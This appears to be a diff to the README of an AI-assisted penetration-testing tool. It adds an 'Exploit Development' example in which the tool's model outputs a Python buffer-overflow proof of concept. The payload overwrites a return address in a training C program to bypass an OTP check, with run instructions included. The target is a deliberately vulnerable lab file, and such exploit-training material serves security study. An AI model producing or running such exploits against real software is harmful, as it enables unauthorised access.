@@ -5,9 +5,9 @@ Beta release of Cybertron Model
 ## Setup
 
 ```
-pip install langchain
+pip install langchain tiktoken openai
 ```
-### Example run
+## Code Review
 ```
 $ python .\PenTestTool.py -m model.jsonl -t -p train -P train --provider azure --azure-model CodeSec --mode code-review -f ".c"
 Loaded 2534 records from model.jsonl
@@ -81,6 +81,46 @@ int main(void)
 Taxonomy: The vulnerability is a CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer and a CAPEC-242: Buffer Overflow via Environment Variables.
 
 CVSS Score: The CVSS3.1 score for this vulnerability is 7.8 (High).
+```
+----
+## Exploit Development
+
+```
+python .\PenTestTool.py -m model.jsonl -t -p .\train -P train --provider azure --azure-model CodeSec --mode exploit-dev -f ".c"
+Loaded 2534 records from model.jsonl
+CodeSec.ai Training Model Complete
+---------------------------
+Testing: .\train\23-bufferOverflow.c
+Sure, here's a proof of concept in Python to exploit the buffer overflow vulnerability in the provided code:
+
+
+import struct
+
+# Address of the LoadDashboard function
+LOAD_DASHBOARD_ADDR = 0x080491b2
+
+# Address of the root variable
+ROOT_ADDR = 0x0804a048
+
+# Address of the OTP variable
+OTP_ADDR = 0x0804a040
+
+# Address of the tryOTP variable
+TRY_OTP_ADDR = 0x0804a04c
+
+# Offset to overwrite the return address
+RET_OFFSET = 0x5c
+
+# Payload to overwrite the root variable and return to the LoadDashboard function
+payload = b'A' * RET_OFFSET
+payload += struct.pack('<I', ROOT_ADDR)
+payload += b'A' * 4
+payload += struct.pack('<I', LOAD_DASHBOARD_ADDR)
+
+# Send the payload to the vulnerable program
+print(payload)
+
+You can run this code by saving it to a file (e.g. `exploit.py`) and running it with Python: `python exploit.py | ./23-bof`. This will send the payload to the vulnerable program and overwrite the `root` variable with a non-zero value, allowing the user to bypass the OTP check and load the dashboard.
 ```
 
 ### Sales of private models and tooling
